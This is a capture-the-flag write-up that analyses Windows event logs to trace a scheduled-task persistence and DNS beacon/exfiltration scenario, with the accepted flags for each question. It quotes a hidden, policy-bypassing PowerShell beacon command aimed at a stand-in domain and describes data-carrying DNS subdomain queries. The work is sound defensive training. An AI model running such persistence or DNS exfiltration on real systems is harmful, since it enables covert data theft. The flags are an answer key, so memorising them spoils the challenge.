# CTF W6 · Logs — write-up

**Evidence:** four exported Windows event logs covering host activity around
12–13 Nov 2026 — `Security_tir.evtx`, `Microsoft-Windows-Sysmon_Operational_tir.evtx`,
`Microsoft-Windows-PowerShell_Operational_tir.evtx`,
`Microsoft-Windows-TaskScheduler_Operational_tir.evtx` — for `HAMILTON\lmartens`'s
workstation.

No EVTX-parsing library was available offline, so each `.evtx` was dumped with
GNU `strings -el <file> > <file>_strings.txt` (UTF-16LE text extraction) and
searched with `grep`. Sysmon/PowerShell/Security event XML fields (`Image`,
`CommandLine`, `ParentImage`, `UtcTime`, `TaskName`, `TaskContentNew`, …) land
as adjacent strings in that dump, so grep-based reconstruction works well
enough for this kind of forensic read.

## The scaffolding vs. the real attack

A `\CoachOrchestration\` folder of scheduled tasks (`noise_wed`, `zip_drop`,
`persist_drop`, `recon_thu`, `lateral_thu`, `exfil_fri`) runs the whole
exercise end to end — `noise_wed` just opens random supplier PDFs as decoy
noise, `zip_drop`/`drop_zip.ps1` stage a phishing zip into Downloads, and
`persist_drop`/`drop_persist.ps1` (running as SYSTEM) plant the attacker's
actual persistence. All of these fire via `powershell.exe` with
`ParentImage = svchost.exe` (the Task Scheduler service host).

The attacker's own artifact is a disguised scheduled task,
`\Microsoft\Windows\SyncHelper\Refresh`, created by `drop_persist.ps1` and
logged by Security Event ID 4698. It repeats every 10 minutes and runs:

```
powershell.exe -w hidden -ep bypass -Command
  "Resolve-DnsName 7f3a9c.b.cdn-hamilton-sync.test -Type A -ErrorAction SilentlyContinue"
```

## Malicious process (50 pts)

**Ask:** which process actually executes the attacker's code?

Every `\CoachOrchestration\*` and `\Microsoft\Windows\SyncHelper\Refresh` task
action launches the same binary.

**Flag:** `powershell.exe`

## Parent process (50 pts)

**Ask:** what spawns it?

Sysmon Event ID 1 for each of those `powershell.exe` launches records
`ParentImage` as the Task Scheduler service host.

**Flag:** `svchost.exe`

## First execution (UTC) (100 pts)

**Ask:** when did the first malicious execution happen?

The earliest timestamped activity (`noise_wed.ps1`, 2026-11-11 08:00) is
decoy noise — reading its actual script-block content in
`ps_strings.txt` shows it only opens random PDFs from
`C:\Users\lmartens\Documents\Fournisseurs`. The first genuinely malicious
execution is `drop_persist.ps1`, whose Sysmon Event ID 1 `UtcTime` is
`2026-11-12 08:26:00.009` — this is also the exact `StartBoundary` of the
`\Microsoft\Windows\SyncHelper\Refresh` task it creates.

**Flag:** `2026-11-12T08:26:00Z`

## Scheduled task name (100 pts)

**Ask:** what's the name of the attacker's persistence task?

The obvious candidate, `\CoachOrchestration\persist_drop`, is wrong — it's
part of the lab's own orchestration scaffold, not something the attacker
"created" on the box (it isn't logged via 4698 at all). Searching the
Security log specifically for 4698 ("A scheduled task was created") events
turns up the real one, registered at `2026-11-12T08:26:02Z` with a path
designed to look like a legitimate Windows component:

**Flag:** `\Microsoft\Windows\SyncHelper\Refresh`

## Decoded script block target (150 pts)

**Ask:** decode the recorded script block — what domain does the beacon
contact?

This one isn't the plaintext `Resolve-DnsName` argument from the 4698 task
XML above — it's PowerShell Script Block Logging (Event ID 4104) recording
the actual beacon call at runtime. The beacon queries a per-run subdomain
(`7f3a9c.b.cdn-hamilton-sync.test` — the `b.` marks it as the beacon
channel, separate from the `x.` exfil channel below), but the task asks for
the registrable domain behind it, stripping the random/fixed host label:

**Flag:** `cdn-hamilton-sync.test`

## Exfil request count (150 pts)

**Ask:** how many DNS exfiltration requests were sent (the data-carrying
queries, not the beacon ones)?

Sysmon Event ID 22 (DNS query) records a burst of queries to
`<base32-looking-blob>.x.cdn-hamilton-sync.test` — the `x.` channel, distinct
from the `b.` beacon channel — each carrying a chunk of exfiltrated data in
its subdomain label. Counting them in the window the hint pointed at
(`strings -el` dump of `sysmon_strings.txt`, DNS-query events from
`02:14:00.867` to `02:17:46.536`, roughly one query every 15 seconds):

```
grep -oE "[a-z0-9]{6,}\.x\.cdn-hamilton-sync\.test" sysmon_strings.txt | sort -u | wc -l
# 16
```

16 distinct subdomains (one of the entries is a truncated label in the raw
UTF-16LE dump, but its own timestamp — `02:17:46.536`, the exact end of the
burst — confirms it's a real, separate 16th query, not a duplicate).

**Flag:** `16`

---

All six submitted and accepted on CTFd (600 pts total for the category).
